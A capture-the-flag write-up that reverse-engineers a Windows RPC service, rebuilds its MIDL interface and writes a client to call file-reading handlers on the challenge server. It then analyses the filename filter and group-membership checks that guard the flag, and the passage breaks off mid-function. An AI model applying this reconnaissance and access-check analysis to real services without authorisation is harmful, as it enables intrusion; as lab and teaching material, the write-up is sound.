# Insobug challenge

We are given a binary and a server IP (and the information it listens on port 80) we can connect to.

## Initial reverse engineering

First of all let's start by looking at the binary in IDA.

Looking at the main function, we can see it is a Windows service called "Winternals1". We then jump to the function pointer assigned to the field `lpServiceProc`, and then follow the function called after `SetServiceStatus` in order to get to the main service registration code. The code looks as follows:

```cpp
BOOL RegisterService()  // 0x140002640
{
  int v0; // ebx
  unsigned int v1; // eax
  unsigned int v2; // eax
  DWORD LastError; // eax
  SERVICE_STATUS_HANDLE v4; // rcx
  unsigned int v5; // eax
  unsigned int v6; // ebx
  unsigned int v7; // eax
  unsigned int v8; // eax
  unsigned int v9; // eax
  unsigned int v10; // eax
  unsigned int v11; // eax
  HANDLE v12; // rbx
  HKEY hKey; // [rsp+40h] [rbp-28h] BYREF
  DWORD ThreadId; // [rsp+48h] [rbp-20h] BYREF

  hKey = 0i64;
  v0 = 0;
  v1 = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\WebClient\\Parameters", 0, 3u, &hKey);
  if ( v1 )
  {
    sub_140002340(L"RegOpenKeyExW() err: %d - 0x%08x\r\n", v1, v1);
  }
  else
  {
    v2 = RegSetValueExW(hKey, L"AuthForwardServerList", 0, 7u, L"*", 4u);
    if ( v2 )
      sub_140002340(L"RegSetValueExW() err: %d - 0x%08x\r\n", v2, v2);
    else
      v0 = 1;
  }
  if ( hKey )
    RegCloseKey(hKey);
  LastError = GetLastError();
  v4 = hServiceStatus;
  ServiceStatus.dwWin32ExitCode = LastError;
  if ( v0 )
  {
    ServiceStatus.dwCheckPoint = dword_140008034++;
    *&ServiceStatus.dwCurrentState = 2i64;
    ServiceStatus.dwWaitHint = 0;
    SetServiceStatus(hServiceStatus, &ServiceStatus);
    hKey = 0i64;
    sub_140002340(L"INIT > Registering protocol sequence: %ws:%ws\r\n", L"ncacn_http", L"8000");
    v5 = RpcServerUseProtseqEpW(L"ncacn_http", 0xAu, L"8000", 0i64);
    v6 = v5;
    if ( v5 )
    {
      sub_140002340(L"RpcServerUseProtseqEpW() err: %d - 0x%08x\r\n", v5, v5);
    }
    else
    {
      sub_140002340(L"INIT > Registering authentication information\r\n");
      v7 = RpcServerRegisterAuthInfoW(0i64, 10u, 0i64, 0i64);
      v6 = v7;
      if ( v7 )
      {
        sub_140002340(L"RpcServerRegisterAuthInfoW() err: %d - 0x%08x\r\n", v7, v7);
      }
      else
      {
        sub_140002340(L"INIT > Registering interface\r\n");
        v8 = RpcServerRegisterIf2(&i_RpcServerInterface, 0i64, 0i64, 0, 0x4D2u, 0xFFFFFFFF, 0i64);
        v6 = v8;
        if ( v8 )
        {
          sub_140002340(L"RpcServerRegisterIf2() err: %d - 0x%08x\r\n", v8, v8);
        }
        else
        {
          sub_140002340(L"INIT > Querying binding handles\r\n");
          v9 = RpcServerInqBindings(&hKey);
          v6 = v9;
          if ( v9 )
          {
            sub_140002340(L"RpcServerInqBindings() err: %d - 0x%08x\r\n", v9, v9);
          }
          else
          {
            sub_140002340(L"INIT > Registering server\r\n");
            v10 = RpcEpRegisterW(&i_RpcServerInterface, hKey, 0i64, 0i64);
            v6 = v10;
            if ( v10 )
            {
              sub_140002340(L"RpcEpRegisterW() err: %d - 0x%08x\r\n", v10, v10);
            }
            else
            {
              sub_140002340(L"INIT > Starting server\r\n");
              v11 = RpcServerListen(1u, 0x4D2u, 1u);
              v6 = v11;
              if ( v11 )
                sub_140002340(L"RpcServerListen() err: %d - 0x%08x\r\n", v11, v11);
              else
                sub_140002340(L"INIT > Server initialization done\r\n");
            }
          }
        }
      }
    }
    if ( hKey )
      RpcBindingVectorFree(&hKey);
    if ( v6 || (hEvent = CreateEventW(0i64, 1, 0, 0i64)) == 0i64 )
    {
      ServiceStatus.dwWin32ExitCode = GetLastError();
      ServiceStatus.dwControlsAccepted = 1;
    }
    else
    {
      ServiceStatus.dwCurrentState = 4;
      *&ServiceStatus.dwControlsAccepted = 1i64;
      *&ServiceStatus.dwCheckPoint = 0i64;
      SetServiceStatus(hServiceStatus, &ServiceStatus);
      v12 = CreateThread(0i64, 0i64, RpcMgmtWaitServerListen, 0i64, 0, &ThreadId);
      if ( v12 )
      {
        WaitForSingleObject(hEvent, 0xFFFFFFFF);
        WaitForSingleObject(v12, 0xFFFFFFFF);
      }
      *&ServiceStatus.dwControlsAccepted = 1i64;
    }
    v4 = hServiceStatus;
  }
  else
  {
    ServiceStatus.dwControlsAccepted = 1;
  }
  ServiceStatus.dwCurrentState = 1;
  *&ServiceStatus.dwCheckPoint = 0i64;
  return SetServiceStatus(v4, &ServiceStatus);
}
```

The function seems to register a `ncacn_http` RPC interface on endpoint `8000`. I have initially skipped over the registry code at the top of this function and will get to it later.

I have never worked with Windows services using the RpcServer* APIs before, but I did do some simple reverse engineering of COM servers on Windows, which seem to use vtables and the calls are identifier by ordinals. It is likely that the RPC servers works similarly. In here I noticed `RpcServerRegisterIf2` seems to accept a global that I thought probably contains the service data. This parameter is called `IfSpec` in Windows documentation and the description of it "MIDL-generated structure indicating the interface to register". MIDL is also used for COM! Before investigating what this structure exactly contains, I quickly looked at the other function and saw that some of the functions look as follows:

```cpp
__int64 __fastcall sub_140001560(__int64 a1, wchar_t *a2, int *a3)
{
  ...

  sub_140002340(L"REQUEST > InsoRpcQueryFileAttributes\r\n");
  if ( !a2 || !a3 || !(unsigned int)sub_140002B10(a2) )
  {
    v5 = -2147024809;
    goto LABEL_14;
  }
  
  ...

  sub_140002340(L"RESPONSE > InsoRpcQueryFileAttributes: 0x%08x\r\n", v5);
  return v5;
}
```

This function is clearly an RPC handler based on the strings. By looking at the xref, we can find a method table with all the other RPC handlers:
```
.rdata:0000000140004810 off_140004810   dq offset sub_140001070 ; DATA XREF: .rdata:0000000140004B38↓o
.rdata:0000000140004818                 dq offset sub_1400011A0
.rdata:0000000140004820                 dq offset sub_140001430
.rdata:0000000140004828                 dq offset sub_140001560
.rdata:0000000140004830                 dq offset sub_140001690
.rdata:0000000140004838                 dq offset sub_1400018A0
.rdata:0000000140004840                 dq offset sub_140001B70
.rdata:0000000140004848                 dq offset sub_140001DD0
.rdata:0000000140004850                 dq offset sub_140001FB0
.rdata:0000000140004858                 dq offset sub_1400021E0
```

I also quickly looked at the string table to see whether this isn't maybe just an HTTP API, but this seemed unlikely as no string that looked like an endpoint names was present. I also tried querying the server IP, which was running IIS with a few random URLs I could think of based on the RPC names, but I only got 404s back. So, I looked in Google what `ncacn_http` is (from the service registration code), as that is our main hint. I ended up on this page: https://learn.microsoft.com/en-us/windows/win32/midl/ncacn-http, which seems to suggest that `ncacn_http` just uses HTTP as a transport for whatever the actual RPC protocol that Windows uses is.

Before trying to find a RPC client for this service, I decided to quickly name the functions in IDA based on the strings present in them. This gave me the following RPC method handler table:
```
.rdata:0000000140004810 off_140004810   dq offset InsoRpcQueryCurrentUser
.rdata:0000000140004818                 dq offset InsoRpcQueryFileOwner
.rdata:0000000140004820                 dq offset InsoRpcQueryFileSize
.rdata:0000000140004828                 dq offset InsoRpcQueryFileAttributes
.rdata:0000000140004830                 dq offset InsoRpcQueryFileFullPath
.rdata:0000000140004838                 dq offset InsoRpcQueryDirectory
.rdata:0000000140004840                 dq offset InsoRpcFileExists
.rdata:0000000140004848                 dq offset InsoRpcReadFile
.rdata:0000000140004850                 dq offset InsoRpcReadFilePrivileged
.rdata:0000000140004858                 dq offset InsoRpcWriteFile
```

## Creating an initial MIDL file

I had trouble finding an open source client for this protocol (but another team member found [Impacket](https://github.com/fortra/impacket), so one does exist!). I however quickly found out that we can just use the Windows RPC library. I found example code on Microsoft's website: https://learn.microsoft.com/en-us/windows/win32/rpc/the-client-application 

To use Microsoft's RPC library we will need to create a MIDL file matching the original RPC interface. Please note that it is very likely this step could be skipped altogether by using something like `RpcView` and I tried to get it to work to show how to use it in this writeup, but it seems not to support the latest version of Windows 10 at the time of writing.

An example MIDL declaration can be generated from the hello.idl file found on Microsoft's website (https://learn.microsoft.com/en-us/windows/win32/rpc/the-idl-file). I have generated the client and server stub files and uploaded them to this repository.

The `IfSpec` parameter passed to `RpcServerRegisterIf2` is of type `RPC_IF_HANDLE` and in the generated files we can find the `hello_v1_0_s_ifspec` declaration. In the `example_s.c` file, we can find the following code:
```cpp
static const RPC_SERVER_INTERFACE hello___RpcServerInterface =
    {
    sizeof(RPC_SERVER_INTERFACE),
    {{0x7a98c250,0x6808,0x11cf,{0xb7,0x3b,0x00,0xaa,0x00,0xb6,0x77,0xa7}},{1,0}},
    {{0x8A885D04,0x1CEB,0x11C9,{0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60}},{2,0}},
    (RPC_DISPATCH_TABLE*)&hello_v1_0_DispatchTable,
    0,
    0,
    0,
    &hello_ServerInfo,
    0x06000000
    };
RPC_IF_HANDLE hello_v1_0_s_ifspec = (RPC_IF_HANDLE)& hello___RpcServerInterface;
```

This means that the parameter passed to `RpcServerRegisterIf2` is of type `RPC_SERVER_INTERFACE*`. Let's set the type and some names in IDA:
```
.rdata:00000001400046E0 ; RPC_SERVER_INTERFACE i_RpcServerInterface
.rdata:00000001400046E0 i_RpcServerInterface dd 60h                  ; Length
.rdata:00000001400046E0                                         ; DATA XREF: RegisterService+1B2↑o
.rdata:00000001400046E0                                         ; RegisterService+237↑o ...
.rdata:00000001400046E0                 dd 8554CA4h             ; InterfaceId.SyntaxGUID.Data1
.rdata:00000001400046E0                 dw 22B3h                ; InterfaceId.SyntaxGUID.Data2
.rdata:00000001400046E0                 dw 4D86h                ; InterfaceId.SyntaxGUID.Data3
.rdata:00000001400046E0                 db 0A1h, 5, 0EBh, 93h, 0FEh, 22h, 0E4h, 49h; InterfaceId.SyntaxGUID.Data4
.rdata:00000001400046E0                 dw 1                    ; InterfaceId.SyntaxVersion.MajorVersion
.rdata:00000001400046E0                 dw 0                    ; InterfaceId.SyntaxVersion.MinorVersion
.rdata:00000001400046E0                 dd 8A885D04h            ; TransferSyntax.SyntaxGUID.Data1
.rdata:00000001400046E0                 dw 1CEBh                ; TransferSyntax.SyntaxGUID.Data2
.rdata:00000001400046E0                 dw 11C9h                ; TransferSyntax.SyntaxGUID.Data3
.rdata:00000001400046E0                 db 9Fh, 0E8h, 8, 0, 2Bh, 10h, 48h, 60h; TransferSyntax.SyntaxGUID.Data4
.rdata:00000001400046E0                 dw 2                    ; TransferSyntax.SyntaxVersion.MajorVersion
.rdata:00000001400046E0                 dw 0                    ; TransferSyntax.SyntaxVersion.MinorVersion
.rdata:00000001400046E0                 db 4 dup(0)
.rdata:00000001400046E0                 dq offset i_DispatchTable; DispatchTable
.rdata:00000001400046E0                 dd 0                    ; RpcProtseqEndpointCount
.rdata:00000001400046E0                 db 4 dup(0)
.rdata:00000001400046E0                 dq 0                    ; RpcProtseqEndpoint
.rdata:00000001400046E0                 dq 0                    ; DefaultManagerEpv
.rdata:00000001400046E0                 dq offset i_ServerInfo  ; InterpreterInfo
.rdata:00000001400046E0                 dd 6000000h             ; Flags
.rdata:00000001400046E0                 db 4 dup(0)
```

I used i_ as a prefix for all the names. This structure gives us the server GUID (which unfortunately needs to be manually stitched together): `08554ca4-22b3-4d86-a105-eb93fe22e449`; as well as the service version which is 1.0.

At this point I decided to try my luck in guessing the MIDL. I looked at the parameter types for each RPC function and made the following file:

```cpp
import "oaidl.idl";
import "ocidl.idl";

[
    uuid(08554CA4-22B3-4D86-A105-EB93FE22E449),
    version(1.0)
]
interface CtfInterface {
    HRESULT InsoRpcQueryCurrentUser([out] wchar_t** outUser);
    HRESULT InsoRpcQueryFileOwner([in] const wchar_t* path, [out] wchar_t** outOwnerName);
    HRESULT InsoRpcQueryFileSize([in] const wchar_t* path, [out] unsigned int* outSize);
    HRESULT InsoRpcQueryFileAttributes([in] const wchar_t* path, [out] int* outAttributes);
    HRESULT InsoRpcQueryFileFullPath([in] const wchar_t* path, [out] wchar_t** outFullPath);
    HRESULT InsoRpcQueryDirectory([in] const wchar_t* path, [out] wchar_t** outListing);
    HRESULT InsoRpcFileExists([in] const wchar_t* path, [out] boolean* outExists);
    HRESULT InsoRpcReadFile([in] const wchar_t* path, [out, size_is(, *outSize)] byte** outData, [out] unsigned short* outSize);
    HRESULT InsoRpcReadFilePrivileged([in] const wchar_t* path, [out, size_is(, *outSize)] byte** outData, [out] unsigned short* outSize);
    HRESULT InsoRpcWriteFile([in] const wchar_t* path, [in, size_is(size)] byte* data, [in] unsigned short size);
};
```

I guessed the return to be a HRESULT, because the functions returned seemed to return values that mapped to existing HRESULT values in Windows.

## Creating a client

Let's create a client based on the example given by Microsoft. I created a new C++ Console Application project in Visual Studio Community 2022.

Then I added a new IDL file to the project, by right clicking on the project name in the Solution Explorer and selecting Add -> New Item. From the dialog I selected Visual C++ -> Code -> Midl file, and named the file `ctf.idl`.

Afterwards I copied the example code from Microsoft's website and edited it to use the UTF-16 APIs, as follows:

```cpp
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
#include <windows.h>
#include "ctf_h.h"

int main()
{
    RPC_STATUS status;
    RPC_WSTR pszUuid = (RPC_WSTR) NULL;
    RPC_WSTR pszProtocolSequence = (RPC_WSTR) L"ncacn_http";
    RPC_WSTR pszNetworkAddress = (RPC_WSTR) L"insobug.insomnihack.ch";
    RPC_WSTR pszEndpoint = (RPC_WSTR) L"8000";
    RPC_WSTR pszOptions = NULL;
    RPC_WSTR pszStringBinding = NULL;
    unsigned long ulCode;

    status = RpcStringBindingCompose(pszUuid,
        pszProtocolSequence,
        pszNetworkAddress,
        pszEndpoint,
        pszOptions,
        &pszStringBinding);
    if (status) exit(status);
    
    status = RpcBindingFromStringBinding(pszStringBinding, &hCtf);

    wprintf(L"%s\n", pszStringBinding);

    if (status) exit(status);
    
    RpcTryExcept
    {
        HRESULT res;

        boolean exists = false;
        res = InsoRpcFileExists((wchar_t*)L"C:\\", &exists);

        printf("%d\n", exists);
  }
  RpcExcept(1)
  {
    ulCode = RpcExceptionCode();
    printf("error 0x%lx = %ld\n", ulCode, ulCode);
  }
  RpcEndExcept
}


void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len) {
  return malloc(len);
}

void __RPC_USER midl_user_free(void __RPC_FAR* ptr) {
  free(ptr);
}
```

The first issue I had was that I could not find a global `RPC_BINDING_HANDLE`, and the generated InsoRpc* functions all required a `RPC_BINDING_HANDLE` as the first parameter. After a while of Googling, I figured I can add an `implicit_handle(handle_t hCtf)` attribute to the `CtfInterface` in the .idl file in order to generate a global `hCtf` handle and have it automatically used.

Adding the `implicit_handle` attribute however caused a compile error: "ACF attributes in the IDL file need the /app_config switch : [implicit_handle]", which I have fixed by going to project properties (right click on the project name in Solution Explorer -> Properties), then changing Application Configuration Mode to "Yes (/app_config)" in MIDL -> General.

We also have to add `Rpcrt4.lib` to Additional Dependencies in Linker -> Input in the project properties. The last issue I had was that the autogenerated IDL client file (`ctf_c.c`) was not compiled by the compiler and I had to add it manually by doing a right click on Source Files -> Add -> Existing Item and selecting the `ctf_c.c` file. This should allow the project to build.

I have initially had trouble getting a previous version of the above code to connect at all - this was because I used the number 80 as the endpoint instead of 8000. However, you are supposed to use 8000, as that is what the RPC server is listening on (see `RegisterService`), even though 80 is the HTTP port exposed to the world (and the code above will actually connect to port 80).

We are now left with the issue that trying to call any of these functions errors out with code 1783, which has the description: "The stub received bad data".

## Fixing the MIDL

I had to see what is wrong. So I looked in the generated `hello_s.c` file, whether it contains any information that could be used to recover the parameter types. It contains a `hello_Ndr64ProcTable` table with a pointer to `__midl_frag2`, which looks like it contains runtime metadata for `HelloProc`. The `hello_Ndr64ProcTable` table can be found in the second element of `hello_SyntaxInfo`, which in turn is referenced by `hello_ServerInfo`. I decided to look for these tables in the provided binary.


I set the type of `i_ServerInfo` to `MIDL_SERVER_INFO` and again named the fields:
```
.rdata:0000000140004B30 ; MIDL_SERVER_INFO i_ServerInfo
.rdata:0000000140004B30 i_ServerInfo    dq offset i_StubDesc    ; pStubDesc
.rdata:0000000140004B30                                         ; DATA XREF: .rdata:i_RpcServerInterface↑o
.rdata:0000000140004B30                                         ; .rdata:i_StubDesc↑o
.rdata:0000000140004B30                 dq offset i_ServerRoutineTable; DispatchTable
.rdata:0000000140004B30                 dq offset i_MIDL_ProcFormatString; ProcString
.rdata:0000000140004B30                 dq offset i_MIDL_FormatStringOffsetTable; FmtStringOffset
.rdata:0000000140004B30                 dq 0                    ; ThunkTable
.rdata:0000000140004B30                 dq offset unk_140004860 ; pTransferSyntax
.rdata:0000000140004B30                 dq 2                    ; nCount
.rdata:0000000140004B30                 dq offset i_SyntaxInfo  ; pSyntaxInfo
```

Next I set the type of `i_SyntaxInfo` to `MIDL_SYNTAX_INFO` and set the array element count to 2 (right click -> Array, and enter 2 to Array Size):

```
.rdata:0000000140004490 ; MIDL_SYNTAX_INFO i_SyntaxInfo
.rdata:0000000140004490 i_SyntaxInfo    dd 8A885D04h            ; TransferSyntax.SyntaxGUID.Data1
.rdata:0000000140004490                                         ; DATA XREF: .rdata:i_ServerInfo↓o
.rdata:0000000140004490                 dw 1CEBh                ; TransferSyntax.SyntaxGUID.Data2
.rdata:0000000140004490                 dw 11C9h                ; TransferSyntax.SyntaxGUID.Data3
.rdata:0000000140004490                 db 9Fh, 0E8h, 8, 0, 2Bh, 10h, 48h, 60h; TransferSyntax.SyntaxGUID.Data4
.rdata:0000000140004490                 dw 2                    ; TransferSyntax.SyntaxVersion.MajorVersion
.rdata:0000000140004490                 dw 0                    ; TransferSyntax.SyntaxVersion.MinorVersion
.rdata:0000000140004490                 db 4 dup(0)
.rdata:0000000140004490                 dq offset i_DispatchTable; DispatchTable
.rdata:0000000140004490                 dq offset i_MIDL_ProcFormatString; ProcString
.rdata:0000000140004490                 dq offset i_MIDL_FormatStringOffsetTable; FmtStringOffset
.rdata:0000000140004490                 dq offset i_MIDL_TypeFormatString; TypeString
.rdata:0000000140004490                 dq 0                    ; aUserMarshalQuadruple
.rdata:0000000140004490                 dq 0                    ; pMethodProperties
.rdata:0000000140004490                 dq 0                    ; pReserved2
.rdata:0000000140004490                 dd 71710533h            ; TransferSyntax.SyntaxGUID.Data1
.rdata:0000000140004490                 dw 0BEBAh               ; TransferSyntax.SyntaxGUID.Data2
.rdata:0000000140004490                 dw 4937h                ; TransferSyntax.SyntaxGUID.Data3
.rdata:0000000140004490                 db 83h, 19h, 0B5h, 0DBh, 0EFh, 9Ch, 0CCh, 36h; TransferSyntax.SyntaxGUID.Data4
.rdata:0000000140004490                 dw 1                    ; TransferSyntax.SyntaxVersion.MajorVersion
.rdata:0000000140004490                 dw 0                    ; TransferSyntax.SyntaxVersion.MinorVersion
.rdata:0000000140004490                 db 4 dup(0)
.rdata:0000000140004490                 dq offset unk_140004B70 ; DispatchTable
.rdata:0000000140004490                 dq 0                    ; ProcString
.rdata:0000000140004490                 dq offset i_Ndr64ProcTable; FmtStringOffset
.rdata:0000000140004490                 dq 0                    ; TypeString
.rdata:0000000140004490                 dq 0                    ; aUserMarshalQuadruple
.rdata:0000000140004490                 dq 0                    ; pMethodProperties
.rdata:0000000140004490                 dq 0                    ; pReserved2
```

I named the FmtStringOffset value of the second entry as `i_Ndr64ProcTable` and named the entries in it according to the RPC call names. It seems that there is exactly one entry for each RPC. It also seems that the decompiler deduplicated identical definitions.

```
.rdata:0000000140004530 i_Ndr64ProcTable dq offset __midl_frag_InsoRpcQueryCurrentUser
.rdata:0000000140004530                                         ; DATA XREF: .rdata:i_SyntaxInfo↑o
.rdata:0000000140004538                 dq offset __midl_frag_InsoRpcQueryFileOwner
.rdata:0000000140004540                 dq offset __midl_frag_InsoRpcQueryFileSize
.rdata:0000000140004548                 dq offset __midl_frag_InsoRpcQueryFileSize
.rdata:0000000140004550                 dq offset __midl_frag_InsoRpcQueryFileOwner
.rdata:0000000140004558                 dq offset __midl_frag_InsoRpcQueryFileOwner
.rdata:0000000140004560                 dq offset __midl_frag_InsoRpcFileExists
.rdata:0000000140004568                 dq offset __midl_frag_InsoRpcReadFile
.rdata:0000000140004570                 dq offset __midl_frag_InsoRpcReadFile
.rdata:0000000140004578                 dq offset __midl_frag_InsoRpcWriteFile
```

I then looked at the definition for `InsoRpcQueryFileExists` and manually set up the struct (I am not sure what the unknown 8 bytes before the first `_NDR64_PARAM_FORMAT` is). The structure first has a `_NDR64_PROC_FORMAT` header, which contains information for the structure itself (including the parameter count), and is then followed by a `_NDR64_PARAM_FORMAT` item for each parameter. The structure for `InsoRpcQueryFileExists` looks as follows:
```
.rdata:0000000140004630 ; _NDR64_PROC_FORMAT _midl_frag_InsoRpcFileExists
.rdata:0000000140004630 __midl_frag_InsoRpcFileExists _NDR64_PROC_FORMAT <10C0040h, 20h, 0, 25h, 0, 0, 3, 8>
.rdata:0000000140004630                                         ; DATA XREF: .rdata:0000000140004560↑o
.rdata:0000000140004648                 dq 72h
.rdata:0000000140004650 ; _NDR64_PARAM_FORMAT
.rdata:0000000140004650                 _NDR64_PARAM_FORMAT <offset unk_1400046DC, <0Bh, 1>, 0, 8>
.rdata:0000000140004650                 _NDR64_PARAM_FORMAT <offset unk_140004473, <50h, 81h>, 0, 10h>
.rdata:0000000140004650                 _NDR64_PARAM_FORMAT <offset unk_140004472, <0F0h, 0>, 0, 18h>
```

I unpacked the flags from `_NDR64_PARAM_FORMAT` for the first parameter (the `<0Bh, 1>` part which is `0x10B`) and discovered that it has set the following flags: `MustSize | MustFree | IsIn | IsSimpleRef`. Another member of the team has found the definition of these flags in a header file of a project called mIDA: https://github.com/tenable/mIDA/blob/578f9eacda4d98c7bf2213dbca8446b3156bd7ab/midl.h#L311. In here we have a suggestion that this might be a `[string]` parameter. I have tried adding the `[string]` flag to the IDL and it.. worked!

Another way to discover the same thing is to figure out that `Type` fields points to a structure which always seems to start with a `NDR64_FORMAT_CHAR` value (which is an `uint8`) specifying the type of the field. In this case it has the value `0x64`, which corresponds to `FC64_CONF_WCHAR_STRING`, which suggests it's a string.

After this correction, the IDL file looks as follows:

```c++
[
    uuid(08554CA4-22B3-4D86-A105-EB93FE22E449),
    version(1.0),
    implicit_handle(handle_t hCtf)
]
interface CtfInterface {
    HRESULT InsoRpcQueryCurrentUser([out] wchar_t** outUser);
    HRESULT InsoRpcQueryFileOwner([in][string] const wchar_t* path, [out] wchar_t** outOwnerName);
    HRESULT InsoRpcQueryFileSize([in][string] const wchar_t* path, [out] unsigned int* outSize);
    HRESULT InsoRpcQueryFileAttributes([in][string] const wchar_t* path, [out] int* outAttributes);
    HRESULT InsoRpcQueryFileFullPath([in][string] const wchar_t* path, [out] wchar_t** outFullPath);
    HRESULT InsoRpcQueryDirectory([in][string] const wchar_t* path, [out] wchar_t** outListing);
    HRESULT InsoRpcFileExists([in][string] const wchar_t* path, [out] boolean* outExists);
    HRESULT InsoRpcReadFile([in][string] const wchar_t* path, [out, size_is(, *outSize)] byte** outData, [out] unsigned short* outSize);
    HRESULT InsoRpcReadFilePrivileged([in][string] const wchar_t* path, [out, size_is(, *outSize)] byte** outData, [out] unsigned short* outSize);
    HRESULT InsoRpcWriteFile([in][string] const wchar_t* path, [in, size_is(size)] byte* data, [in] unsigned short size);
};
```

However, trying to call `InsoRpcReadFile` still doesn't work and errors out with the dreaded code 1783! As well as some other functions. I have started looking at the data for `__midl_frag_InsoRpcReadFile`:

```
.rdata:00000001400045D0 ; _NDR64_PROC_FORMAT _midl_frag_InsoRpcReadFile
.rdata:00000001400045D0 __midl_frag_InsoRpcReadFile _NDR64_PROC_FORMAT <10E0040h, 28h, 0, 26h, 0, 0, 4, 8>
.rdata:00000001400045D0                                         ; DATA XREF: .rdata:0000000140004568↑o
.rdata:00000001400045D0                                         ; .rdata:0000000140004570↑o
.rdata:00000001400045E8                 dq 72h
.rdata:00000001400045F0 ; _NDR64_PARAM_FORMAT
.rdata:00000001400045F0                 _NDR64_PARAM_FORMAT <offset unk_1400046DC, <0Bh, 1>, 0, 8>
.rdata:00000001400045F0                 _NDR64_PARAM_FORMAT <offset unk_140004430, <13h, 80h>, 0, 10h>
.rdata:00000001400045F0                 _NDR64_PARAM_FORMAT <offset unk_1400046D8, <50h, 81h>, 0, 18h>
.rdata:00000001400045F0                 _NDR64_PARAM_FORMAT <offset unk_140004472, <0F0h, 0>, 0, 20h>
```

Which based on the information above, let us figure out that the `[out]` parameters are also strings.

```cpp
[
    uuid(08554CA4-22B3-4D86-A105-EB93FE22E449),
    version(1.0),
    implicit_handle(handle_t hCtf)
]
interface CtfInterface {
    HRESULT InsoRpcQueryCurrentUser([out][string] wchar_t** outUser);
    HRESULT InsoRpcQueryFileOwner([in][string] const wchar_t* path, [out][string] wchar_t** outOwnerName);
    HRESULT InsoRpcQueryFileSize([in][string] const wchar_t* path, [out] unsigned int* outSize);
    HRESULT InsoRpcQueryFileAttributes([in][string] const wchar_t* path, [out] int* outAttributes);
    HRESULT InsoRpcQueryFileFullPath([in][string] const wchar_t* path, [out][string] wchar_t** outFullPath);
    HRESULT InsoRpcQueryDirectory([in][string] const wchar_t* path, [out][string] wchar_t** outListing);
    HRESULT InsoRpcFileExists([in][string] const wchar_t* path, [out] boolean* outExists);
    HRESULT InsoRpcReadFile([in][string] const wchar_t* path, [out][string] char** outData, [out] unsigned short* outSize);
    HRESULT InsoRpcReadFilePrivileged([in][string] const wchar_t* path, [out][string] char** outData, [out] unsigned short* outSize);
    HRESULT InsoRpcWriteFile([in][string] const wchar_t* path, [in][string] char* data, [in] unsigned short size);
};
```

This seemed to work, but gave us a `0x80070005` response (which is not an RPC error at least!) from everything other than `InsoRpcFileExists`...

## Getting the user credentials

The `InsoRpcReadFile` function looks as follows (I changed the return codes to hex):

```cpp
__int64 __fastcall InsoRpcReadFile(RPC_BINDING_HANDLE BindingHandle, wchar_t *Str, _QWORD *a3, _WORD *a4)
{
  unsigned int v8; // ebx
  int v9; // esi
  DWORD LastError; // ebx
  DWORD v11; // eax
  HANDLE FileW; // rbx
  HLOCAL v13; // rax
  void *v14; // rdi
  void *v15; // rcx
  size_t v16; // rbp
  void *v17; // rax
  signed int v18; // eax
  DWORD NumberOfBytesRead; // [rsp+40h] [rbp-48h] BYREF

  sub_140002340(L"REQUEST > InsoRpcReadFile\r\n");
  if ( !Str || !a3 || !a4 || !(unsigned int)sub_140002B10(Str) )
  {
    v8 = 0x80070057;
    goto LABEL_26;
  }
  if ( !sub_140002B90() )
  {
    v8 = 0x80070005;
    goto LABEL_26;
  }
  v9 = 0;
  if ( RpcImpersonateClient(BindingHandle) )
  {
    LastError = GetLastError();
    v11 = GetLastError();
    sub_140002340(L"RpcImpersonateClient() err: %d - 0x%08x\r\n", v11, LastError);
  }
  else
  {
    v9 = 1;
  }
  FileW = CreateFileW(Str, 0x80000000, 1u, 0i64, 3u, 0x80u, 0i64);
  if ( FileW == (HANDLE)-1i64 )
    goto LABEL_18;
  v13 = LocalAlloc(0x40u, 0x400ui64);
  v14 = v13;
  v15 = FileW;
  if ( !v13 )
  {
LABEL_17:
    CloseHandle(v15);
LABEL_18:
    v18 = GetLastError();
    v8 = v18;
    if ( v18 > 0 )
      v8 = (unsigned __int16)v18 | 0x80070000;
    v14 = 0i64;
    goto LABEL_21;
  }
  if ( !ReadFile(FileW, v13, 0x400u, &NumberOfBytesRead, 0i64) )
  {
    LocalFree(v14);
    v15 = FileW;
    goto LABEL_17;
  }
  v16 = NumberOfBytesRead;
  CloseHandle(FileW);
  v17 = malloc((unsigned int)v16);
  *a3 = v17;
  if ( v17 )
  {
    memcpy(v17, v14, v16);
    v8 = 0;
    *a4 = v16;
  }
  else
  {
    v8 = 0x8007000E;
  }
LABEL_21:
  if ( v9 )
    RpcRevertToSelf();
  if ( v14 )
    LocalFree(v14);
LABEL_26:
  sub_140002340(L"RESPONSE > InsoRpcReadFile: 0x%08x\r\n", v8);
  return v8;
}
```

Let's start from the `sub_140002B10` function called at the top (which is called with the file name):

```cpp
__int64 __fastcall sub_140002B10(wchar_t *fileName)
{
  const wchar_t *fileNameOrigPtr; // r9
  __int64 len2; // rdx
  unsigned __int64 len1; // rax
  unsigned int v4; // r8d

  fileNameOrigPtr = fileName;
  if ( fileName )
  {
    len2 = -1i64;
    len1 = -1i64;
    do
      ++len1;
    while ( fileName[len1] );
    if ( len1 <= 0x104 )
    {
      v4 = 0;
      do
        ++len2;
      while ( fileName[len2] );
      if ( (_DWORD)len2 )
      {
        while ( (unsigned __int16)(*fileName - 0x14) <= 0x6Au )
        {
          ++v4;
          ++fileName;
          if ( v4 >= (unsigned int)len2 )
            goto LABEL_10;
        }
      }
      else
      {
LABEL_10:
        if ( !wcsstr(fileNameOrigPtr, L"flag.txt") )
          return 1i64;
      }
    }
  }
  return 0i64;
}
```

The function checks that the file name has the character count less or equal to 0x104, validates that the filename only contains ASCII characters in the range `\x14-\x7e` and then ensures that the string `flag.txt` is not present in the file name.

Then the second function, `sub_140002B90`, which also causes the return code `0x80070005` which we are running into, looks as follows:

```cpp
_BOOL8 sub_140002B90()
{
  unsigned int v0; // eax
  RPC_AUTHZ_HANDLE Privs; // [rsp+30h] [rbp-18h] BYREF

  Privs = 0i64;
  v0 = RpcBindingInqAuthClientW(0i64, &Privs, 0i64, 0i64, 0i64, 0i64);
  if ( v0 )
  {
    sub_140002340(L"RpcBindingInqAuthClientW() err: %d - 0x%08x\r\n", v0, v0);
    return 0i64;
  }
  return Privs && (unsigned int)sub_140002C30(L"S-1-5-32-545", (const wchar_t *)Privs);
}
```

And the function `sub_140002C30` as follows:

```cpp
__int64 __fastcall sub_140002C30(const WCHAR *a1, const wchar_t *a2)
{
  unsigned int v2; // esi
  WCHAR *ReferencedDomainName; // rbp
  DWORD v5; // ebx
  DWORD v6; // eax
  WCHAR *v7; // rbx
  DWORD LastError; // ebx
